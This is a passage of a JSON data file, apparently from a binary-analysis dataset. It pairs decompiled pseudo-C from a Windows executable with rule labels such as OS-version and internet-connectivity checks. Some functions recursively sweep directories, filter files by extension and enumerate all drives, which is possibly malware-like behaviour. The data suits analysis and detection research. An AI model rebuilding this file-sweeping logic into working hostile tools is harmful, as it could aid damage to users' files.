            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00411f9c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040ead8();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040ead8();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00412265": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412265(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00411b8a(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040ead8();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040ead8();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00411b63(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00411ffd(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00405cfb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405cfb(uint arg_8h)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint uVar8;\n    uint noname_1;\n    uint in_stack_fffffc70;\n    uchar *in_stack_fffffc74;\n    uint in_stack_fffffc78;\n    uint in_stack_fffffc7c;\n    uchar *in_stack_fffffc80;\n    uchar *in_stack_fffffc84;\n    uint in_stack_fffffc88;\n    uint arg_24h;\n    uint in_stack_fffffc90;\n    uint in_stack_fffffc94;\n    uint in_stack_fffffc98;\n    uint in_stack_fffffc9c;\n    uchar *in_stack_fffffca0;\n    uint32_t uVar9;\n    uchar *arg_8h_00;\n    uint uStack812;\n    ushort uStack788;\n    uint uStack784;\n    uchar *puStack780;\n    uint uStack772;\n    uint uStack768;\n    uint32_t uStack760;\n    ushort uStack756;\n    uchar auStack744 [4];\n    uint uStack740;\n    uint uStack736;\n    uchar auStack676 [20];\n    uint8_t auStack656 [16];\n    uchar auStack640 [4];\n    uchar auStack636 [12];\n    uchar auStack624 [4];\n    uchar auStack620 [8];\n    uchar auStack612 [8];\n    uchar auStack604 [592];\n    uint32_t uStack12;\n    \n    uStack12 = *0x401304 ^ &stack0xfffffcec;\n    uStack784 = 0;\n    fcn.0040736a(&fcn.00405cfb::arg_8h);\n    uStack812 = 0x405d3f;\n    fcn.00407390(0x4041bc);\n    uStack812 = 7;\n    uStack756 = 0;\n    puVar6 = &fcn.00405cfb::arg_8h;\n    uStack736 = 7;\n    uStack740 = 0;\n    fcn.0040736a(puVar6);\n    fcn.00406ba0(puVar6);\n    uStack788 = 0;\n    uStack768 = 7;\n    uStack772 = 0;\n    fcn.00407c54();\n    fcn.00407ea6(&stack0xfffffd5c, 0);\n    arg_8h_00 = &stack0xfffffd70;\n    fcn.00407ea6(arg_8h_00, 0);\n    fcn.00407492();\n    uVar9 = 1;\n    fcn.00407574(1);\n    if (uStack760 < 8) {\n        puStack780 = &stack0xfffffcf4;\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(puStack780, &stack0xfffffd80);\n    if (iVar4 != -1) {\n        do {\n            pcVar1 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n            iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&stack0xfffffda4, 0x4041c4);\n            if (((((((iVar5 == 0) || (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4041c8),  iVar5 == 0)) ||\n                   (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4041d0),  iVar5 == 0)) ||\n                  (((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4041d8),  iVar5 == 0 ||\n                    (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4041f4),  iVar5 == 0)) ||\n                   ((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4041fc),  iVar5 == 0 ||\n                    ((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404218),  iVar5 == 0 ||\n                     (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404224),  iVar5 == 0)))))))) ||\n                 ((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404238),  iVar5 == 0 ||\n                  (((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404248),  iVar5 == 0 ||\n                    (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404248),  iVar5 == 0)) ||\n                   (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x40425c),  iVar5 == 0)))))) ||\n                (((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404278),  iVar5 == 0 ||\n                  (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404290),  iVar5 == 0)) ||\n                 (((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4042a8),  iVar5 == 0 ||\n                   ((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4042c0),  iVar5 == 0 ||\n                    (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4042d4),  iVar5 == 0)))) ||\n                  (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x4042f0),  iVar5 == 0)))))) ||\n               (((iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404300),  iVar5 == 0 ||\n                 (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404318),  iVar5 == 0)) ||\n                (iVar5 = (*pcVar1)(&stack0xfffffd9c, 0x404328),  iVar5 == 0)))) {\ncode_r0x00406061:\n                bVar2 = true;\n            }\n            else {\n                fcn.00407390(&stack0xfffffd9c);\n                arg_24h = 0x404338;\n                in_stack_fffffc88 = 0x405ffd;\n                fcn.0040720a(0x404338);\n                uVar8 = 0x40600c;\n                fcn.0040b08b(&stack0xfffffcc0);\n                noname_1 = 0x406012;\n                iVar5 = fcn.0040b20a(in_stack_fffffc70, in_stack_fffffc74, in_stack_fffffc78, in_stack_fffffc7c, \n                                     in_stack_fffffc80, in_stack_fffffc84, in_stack_fffffc88, arg_24h, in_stack_fffffc90\n                                     , in_stack_fffffc94, in_stack_fffffc98, in_stack_fffffc9c, in_stack_fffffca0);\n                if (iVar5 != 0) goto code_r0x00406061;\n                in_stack_fffffca0 = 0x40602a;\n                fcn.00407390(&stack0xfffffd94);\n                in_stack_fffffc84 = 0x404344;\n                in_stack_fffffc80 = 0x40603e;\n                fcn.0040720a(0x404344);\n                fcn.0040b08b(&stack0xfffffcf0);\n                iVar5 = fcn.0040b20a(uVar8, noname_1, in_stack_fffffc70, in_stack_fffffc74, in_stack_fffffc78, \n                                     in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84, in_stack_fffffc88, arg_24h\n                                     , in_stack_fffffc90, in_stack_fffffc94, in_stack_fffffc98);\n                if (iVar5 != 0) goto code_r0x00406061;\n                bVar2 = false;\n            }\n            if ((uVar9 & 2) != 0) {\n                uVar9 = uVar9 & 0xfffffffd;\n                fcn.00407574(1);\n            }\n            if ((uVar9 & 1) != 0) {\n                uVar9 = uVar9 & 0xfffffffe;\n                fcn.00407574(1);\n            }\n            if (!bVar2) {\n                if ((auStack656[0] & 0x10) == 0) {\n                    fcn.00407390(&stack0xfffffd9c);\n                    fcn.0040b08b(&stack0xfffffd18);\n                    fcn.00407574(1);\n                    fcn.004072fb(0x2e);\n                    fcn.0040724e();\n                    in_stack_fffffca0 = &stack0xfffffd90;\n                    fcn.00407390(in_stack_fffffca0);\n                    fcn.0040b08b(&stack0xfffffd0c);\n                    in_stack_fffffc9c = 1;\n                    fcn.00407574(1);\n                    in_stack_fffffc98 = 0x2d;\n                    fcn.004072fb(0x2d);\n                    fcn.0040724e();\n                    fcn.00407ab8(&stack0xfffffd84);\n                    fcn.00407492();\n                    in_stack_fffffc94 = 1;\n                    fcn.00407574(1);\n                    in_stack_fffffc90 = 0x404354;\n                    cVar3 = fcn.00407fdb(0x404354);\n                    if (cVar3 == '\\0') {\n                        in_stack_fffffc90 = 0x40435c;\n                        cVar3 = fcn.00407fdb(0x40435c);\n                        if (cVar3 == '\\0') {\n                            in_stack_fffffc90 = 0x404360;\n                            cVar3 = fcn.00407fdb(0x404360);\n                            if (cVar3 == '\\0') {\n                                in_stack_fffffc90 = 0x404364;\n                                cVar3 = fcn.00407fdb(0x404364);\n                                if (cVar3 == '\\0') {\n                                    in_stack_fffffc90 = 0x404368;\n                                    cVar3 = fcn.00407fdb(0x404368);\n                                    if (cVar3 == '\\0') {\n                                        in_stack_fffffc90 = 0x40436c;\n                                        cVar3 = fcn.00407fdb(0x40436c);\n                                        if (cVar3 == '\\0') {\n                                            in_stack_fffffc90 = 0x404370;\n                                            cVar3 = fcn.00407fdb(0x404370);\n                                            if (cVar3 == '\\0') {\n                                                in_stack_fffffc90 = 0x404374;\n                                                cVar3 = fcn.00407fdb(0x404374);\n                                                if (cVar3 == '\\0') {\n                                                    in_stack_fffffc90 = 0x404378;\n                                                    cVar3 = fcn.00407fdb(0x404378);\n                                                    if (cVar3 == '\\0') {\n                                                        in_stack_fffffc90 = 0x40437c;\n                                                        cVar3 = fcn.00407fdb(0x40437c);\n                                                        if (cVar3 == '\\0') {\n                                                            in_stack_fffffc90 = 0x404380;\n                                                            cVar3 = fcn.00407fdb(0x404380);\n                                                            if (cVar3 == '\\0') {\n                                                                in_stack_fffffc90 = 0x404384;\n                                                                cVar3 = fcn.00407fdb(0x404384);\n                                                                if (cVar3 == '\\0') {\n                                                                    in_stack_fffffc90 = 0x404388;\n                                                                    cVar3 = fcn.00407fdb(0x404388);\n                                                                    if (cVar3 == '\\0') {\n                                                                        in_stack_fffffc90 = 0x40438c;\n                                                                        cVar3 = fcn.00407fdb(0x40438c);\n                                                                        if (cVar3 == '\\0') {\n                                                                            in_stack_fffffc90 = 0x404390;\n                                                                            cVar3 = fcn.00407fdb(0x404390);\n                                                                            if (cVar3 == '\\0') {\n                                                                                in_stack_fffffc90 = 0x404394;\n                                                                                cVar3 = fcn.00407fdb(0x404394);\n                                                                                if (cVar3 == '\\0') {\n                                                                                    in_stack_fffffc90 = 0x404398;\n                                                                                    cVar3 = fcn.00407fdb(0x404398);\n                                                                                    if (cVar3 == '\\0') {\n                                                                                        in_stack_fffffc90 = 0x40439c;\n                                                                                        cVar3 = fcn.00407fdb(0x40439c);\n                                                                                        if (cVar3 == '\\0') {\n                                                                                            in_stack_fffffc90 = 0x4043a0\n                                                                                            ;\n                                                                                            cVar3 = fcn.00407fdb(\n                                                            0x4043a0);\n                                                            if (cVar3 == '\\0') {\n                                                                in_stack_fffffc90 = 0x4043a4;\n                                                                cVar3 = fcn.00407fdb(0x4043a4);\n                                                                if (cVar3 == '\\0') {\n                                                                    in_stack_fffffc90 = 0x4043a8;\n                                                                    cVar3 = fcn.00407fdb(0x4043a8);\n                                                                    if (cVar3 == '\\0') {\n                                                                        in_stack_fffffc90 = 0x4043ac;\n                                                                        cVar3 = fcn.00407fdb(0x4043ac);\n                                                                        if (cVar3 == '\\0') {\n                                                                            in_stack_fffffc90 = 0x4043b0;\n                                                                            cVar3 = fcn.00407fdb(0x4043b0);\n                                                                            if (cVar3 == '\\0') {\n                                                                                in_stack_fffffc90 = 0x4043b4;\n                                                                                cVar3 = fcn.00407fdb(0x4043b4);\n                                                                                if (cVar3 == '\\0') {\n                                                                                    in_stack_fffffc74 = &stack0xfffffcc8\n                                                                                    ;\n                                                                                    fcn.0040736a(in_stack_fffffc74);\n                                                                                    in_stack_fffffc70 = 0x40643a;\n                                                                                    fcn.00406cf7(in_stack_fffffc74, \n                                                                                                 in_stack_fffffc78, \n                                                                                                 in_stack_fffffc7c, \n                                                                                                 in_stack_fffffc80, \n                                                                                                 in_stack_fffffc84, \n                                                                                                 in_stack_fffffc88);\n                                                                                }\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    fcn.00405c90(1);\n                    fcn.00405c90(1);\n                }\n                else {\n                    puVar6 = fcn.00407ab8(&stack0xfffffd9c);\n                    if (-puVar6[4] - 1 < 2) {\n                        fcn.0040b2d9(0x4049e4);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    iVar5 = puVar6[4] + 1;\n                    cVar3 = fcn.00407770(0);\n                    if (cVar3 != '\\0') {\n                        puVar7 = puVar6;\n                        if (7 < puVar6[5]) {\n                            puVar7 = *puVar6;\n                        }\n                        *(puVar7 + puVar6[4] * 2) = 0x5c;\n                        puVar6[4] = iVar5;\n                        if (7 < puVar6[5]) {\n                            puVar6 = *puVar6;\n                        }\n                        *(puVar6 + iVar5 * 2) = 0;\n                    }\n                    fcn.00407c3a();\n                    fcn.00407492();\n                    fcn.00407574(1);\n                    in_stack_fffffca0 = 0x40613c;\n                    fcn.00407574(1);\n                    in_stack_fffffc84 = &stack0xfffffcd8;\n                    fcn.0040736a(in_stack_fffffc84);\n                    fcn.00406ba0(in_stack_fffffc84);\n                    in_stack_fffffc80 = &stack0xfffffcd4;\n                    fcn.0040736a(in_stack_fffffc80);\n                    in_stack_fffffc7c = 0x406161;\n                    fcn.00405cfb(in_stack_fffffc80);\n                }\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(arg_8h_00, &stack0xfffffd70);\n        } while (iVar5 != 0);\n        (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n    }\n    uVar8 = 1;\n    fcn.00407574(1);\n    fcn.00407574(1);\n    fcn.00407574(1);\n    fcn.00407574(1);\n    fcn.0040b39f(uVar8);\n    return;\n}\n",
        "token_count": 3930
    },
    "004072fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407310)\n\nint32_t __cdecl fcn.004072fb(uint arg_8h)\n\n{\n    char **in_EAX;\n    int32_t iVar1;\n    char **ppcVar2;\n    char **ppcVar3;\n    \n    if (in_EAX[4] != NULL) {\n        ppcVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar3 = *in_EAX;\n        }\n        ppcVar3 = ppcVar3 + in_EAX[4] + -1;\n        while( true ) {\n            if ((*ppcVar3 == arg_8h) && (iVar1 = fcn.0040bd01(ppcVar3, &arg_8h, 1),  iVar1 == 0)) {\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                return ppcVar3 - in_EAX;\n            }\n            ppcVar2 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                ppcVar2 = *in_EAX;\n            }\n            if (ppcVar3 == ppcVar2) break;\n            ppcVar3 = ppcVar3 + -1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 301
    },
    "0040802e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040802e(void)\n\n{\n    uint32_t *puVar1;\n    uint ***pppuVar2;\n    int32_t iVar3;\n    uint in_stack_ffffff94;\n    uint32_t uStack100;\n    uint32_t *puStack92;\n    int32_t iStack88;\n    uint32_t *puStack84;\n    int32_t iStack80;\n    uint ***pppuStack76;\n    uint32_t auStack72 [2];\n    uint32_t uStack64;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar auStack44 [4];\n    uchar uStack40;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack12;\n    \n    uStack12 = *0x401304 ^ &stack0xffffff94;\n    auStack72[0] = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    uStack100 = 0;\n    do {\n        if ((auStack72[0] >> (uStack100 & 0x1f) & 1) != 0) {\n            uStack24 = 0;\n            pppuStack76 = pppuStack76 & 0xffffff00 | uStack100 + 0x41;\n            uStack20 = 0xf;\n            uStack40 = 0;\n            fcn.0040834f(pppuStack76);\n            uStack56 = 0;\n            uStack52 = 0xf;\n            auStack72[0] = auStack72[0] & 0xffffff00;\n            fcn.0040d260();\n            fcn.00407c07();\n            iVar3 = 0;\n            fcn.00407c89(auStack44, 0);\n            fcn.0040d260(0x4049f4);\n            fcn.00407d1d(0x4049f4);\n            puVar1 = puStack84;\n            if (uStack64 < 0x10) {\n                puVar1 = auStack72;\n            }\n            (*_sym.imp.KERNEL32.dll_GetDriveTypeA)();\n            fcn.00405c90(1);\n            if (iVar3 == 2) {\n                fcn.0040d260(0x4049f4);\n                fcn.00407d1d(0x4049f4);\n                fcn.004082ae();\n                fcn.0040720a(0x4049f8);\n                fcn.004082ae();\n                fcn.00405c90(1);\n            }\n            if (puVar1 == 0x3) {\n                fcn.0040d260(0x4049f4);\n                fcn.00407d1d(0x4049f4);\n                fcn.004082ae();\n                fcn.0040720a(0x404a04);\n                fcn.004082ae();\n                fcn.00405c90(1);\n            }\n            if (puVar1 == 0x4) {\n                fcn.0040d260(0x4049f4);\n                fcn.00407d1d(0x4049f4);\n                fcn.004082ae();\n                fcn.0040720a(0x404a0c);\n                fcn.004082ae();\n                fcn.00405c90(1);\n            }\n            pppuVar2 = pppuStack76;\n            if (uStack56 < 0x10) {\n                pppuVar2 = &pppuStack76;\n            }\n            (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceExA)(pppuVar2, &stack0xffffff7c, &stack0xffffff84, 0);\n            fcn.00408303();\n            fcn.00408303();\n            uStack100 = puStack84 - puStack92 >> 0x1e | ((iStack80 - iStack88) - (puStack84 < puStack92)) * 4;\n            fcn.00408303();\n            fcn.00405c90(1);\n        }\n        uStack100 = uStack100 + 1;\n    } while (uStack100 < 0x1a);\n    fcn.0040b39f(in_stack_ffffff94);\n    return;\n}\n",
        "token_count": 945
    },
    "0040843e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040843e(int32_t arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t in_ECX;\n    char in_DL;\n    \n    if (arg_8h == 1) {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        *(in_EAX + in_ECX) = in_DL;\n    }\n    else {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        fcn.0040d3f0(in_EAX + in_ECX, in_DL, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "004088aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004088aa(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t lplpBuffer;\n    uint puLen;\n    uint lpdwHandle;\n    \n    lpdwHandle = (*_sym.imp.VERSION.dll_GetFileVersionInfoSizeA)(0x404aa0, &lpdwHandle);\n    uVar2 = fcn.0040b394(lpdwHandle);\n    (*_sym.imp.VERSION.dll_GetFileVersionInfoA)(0x404aa0, 0, lpdwHandle, uVar2);\n    puLen = 0;\n    (*_sym.imp.VERSION.dll_VerQueryValueA)(uVar2, 0x404ab0, &lplpBuffer, &puLen);\n    iVar1 = *(lplpBuffer + 8);\n    if (*(lplpBuffer + 10) == 6) {\n        if (iVar1 == 1) {\n            uVar3 = 0x404ab4;\n            goto code_r0x0040893a;\n        }\n        if (iVar1 == 2) {\n            uVar3 = 0x404ac0;\n            goto code_r0x0040893a;\n        }\n        if (iVar1 == 3) {\n            uVar3 = 0x404acc;\n            goto code_r0x0040893a;\n        }\n    }\n    else if ((*(lplpBuffer + 10) == 10) && (uVar3 = 0x404ad8,  iVar1 == 0)) goto code_r0x0040893a;\n    uVar3 = 0x404ae4;\ncode_r0x0040893a:\n    fcn.0040d260(uVar3);\n    fcn.004075b4();\n    fcn.0040d306(uVar2);\n    return;\n}\n",
        "token_count": 409
    },
    "0040a075": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a075(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 1;\n    cVar1 = fcn.004078c1(0x40543c);\n    if (cVar1 == '\\0') {\n        uVar5 = in_ECX[4];\n        if (uVar5 < in_EAX) {\n            fcn.0040b326(0x4049cc);\n            uVar5 = extraout_ECX;\n        }\n        uVar2 = uVar5 - in_EAX;\n        if (uVar2 == 0) {\n            var_4h = uVar2;\n        }\n        if (-arg_8h - 1 <= uVar5 - var_4h) {\n            uVar2 = fcn.0040b2d9(0x4049e4);\n        }\n        if (arg_8h < var_4h) {\n            puVar3 = in_ECX;\n            puVar4 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n                puVar4 = *in_ECX;\n            }\n            fcn.0040b9a0(puVar3 + arg_8h + in_EAX, puVar4 + var_4h + in_EAX, uVar2 - var_4h);\n        }\n        if ((arg_8h != 0) || (var_4h != 0)) {\n            iVar6 = (arg_8h - var_4h) + in_ECX[4];\n            cVar1 = fcn.0040761d(0);\n            if (cVar1 != '\\0') {\n                if (var_4h < arg_8h) {\n                    puVar3 = in_ECX;\n                    puVar4 = in_ECX;\n                    if (0xf < in_ECX[5]) {\n                        puVar3 = *in_ECX;\n                        puVar4 = *in_ECX;\n                    }\n                    fcn.0040b9a0(puVar3 + arg_8h + in_EAX, puVar4 + var_4h + in_EAX, uVar2 - var_4h);\n                }\n                puVar4 = in_ECX;\n                if (0xf < in_ECX[5]) {\n                    puVar4 = *in_ECX;\n                }\n                fcn.0040b3b0(puVar4 + in_EAX, 0x40543c, arg_8h);\n                in_ECX[4] = iVar6;\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                *(in_ECX + iVar6) = 0;\n            }\n        }\n    }\n    else {\n        puVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar4 = *in_ECX;\n        }\n        fcn.0040a1b4(in_ECX, 0x40543c - puVar4, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 767
    },
    "0040a493": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a493(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *unaff_ESI;\n    \n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U < 2) {\n        iVar2 = fcn.0040b2d9(0x4049e4);\n    }\n    cVar1 = fcn.0040761d(0);\n    if (cVar1 != '\\0') {\n        puVar3 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            puVar3 = *unaff_ESI;\n        }\n        *(puVar3 + unaff_ESI[4]) = arg_8h;\n        unaff_ESI[4] = iVar2 + 1;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + iVar2 + 1) = 0;\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0040a7d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: ppv\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_70h\n\nvoid __cdecl fcn.0040a7d9(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t unaff_EBP;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint ppv;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040dfc0(0x413210, 0x60);\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    *(unaff_EBP + -4) = 0;\n    iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x402090, 0, 1, 0x402080, unaff_EBP + -0x20);\n    if (iVar1 == 0) {\n        *(unaff_EBP + -0x40) = 8;\n        *(unaff_EBP + -0x38) = *(unaff_EBP + 8);\n        (**(**(unaff_EBP + -0x20) + 0x24))\n                  (*(unaff_EBP + -0x20), *(unaff_EBP + -0x40), *(unaff_EBP + -0x3c), *(unaff_EBP + -0x38), \n                   *(unaff_EBP + -0x34), unaff_EBP + -0x1c);\n        if (*(unaff_EBP + -0x1c) != 0) {\n            *(unaff_EBP + -0x50) = 8;\n            *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n            (**(**(unaff_EBP + -0x20) + 0x24))\n                      (*(unaff_EBP + -0x20), *(unaff_EBP + -0x50), *(unaff_EBP + -0x4c), *(unaff_EBP + -0x48), \n                       *(unaff_EBP + -0x44), unaff_EBP + -0x24);\n            piVar2 = *(unaff_EBP + -0x1c);\n            iVar1 = *piVar2;\n            if (*(unaff_EBP + -0x24) != 0) {\n                (**(iVar1 + 0x2c))(piVar2, unaff_EBP + -0x28);\n                piVar2 = *(unaff_EBP + -0x28);\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x1c))(piVar2, unaff_EBP + -0x30);\n                    piVar2 = *(unaff_EBP + -0x28);\n                    if (*(unaff_EBP + -0x30) < 1) {\n                        (*(*piVar2)[2])(piVar2);\n                        (**(**(unaff_EBP + -0x24) + 8))(*(unaff_EBP + -0x24));\n                        (**(**(unaff_EBP + -0x1c) + 8))(*(unaff_EBP + -0x1c));\n                        (**(**(unaff_EBP + -0x20) + 8))(*(unaff_EBP + -0x20));\n                        fcn.0040fd40(0x401304, unaff_EBP + -0x10, 0xfffffffe);\n                    }\n                    else {\n                        (***piVar2)(piVar2, 0x4020a0, unaff_EBP + -0x2c);\n                        *(unaff_EBP + -0x70) = 9;\n                        *(unaff_EBP + -0x68) = *(unaff_EBP + -0x2c);\n                        *(unaff_EBP + -0x60) = 3;\n                        *(unaff_EBP + -0x58) = 0x614;\n                        (**(**(unaff_EBP + -0x24) + 0x3c))\n                                  (*(unaff_EBP + -0x24), *(unaff_EBP + -0x70), *(unaff_EBP + -0x6c), \n                                   *(unaff_EBP + -0x68), *(unaff_EBP + -100), *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c)\n                                   , *(unaff_EBP + -0x58), *(unaff_EBP + -0x54));\n                        (**(**(unaff_EBP + 